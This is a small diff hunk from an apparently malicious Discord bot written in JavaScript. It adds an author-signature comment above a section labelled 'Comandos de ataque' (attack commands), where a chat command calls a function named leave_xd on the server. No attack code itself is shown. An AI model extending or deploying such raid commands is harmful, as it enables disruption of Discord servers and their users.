@@ -161,6 +161,7 @@ client.on(`messageCreate`,async (msg)=>{
         ]})
     };
     //
+    //by ZenX$team jejeje - brzzl
     //Comandos de ataque
     if(msg.content === prefix+"fvcked"){
         leave_xd(msg.guild, msg.author.id);
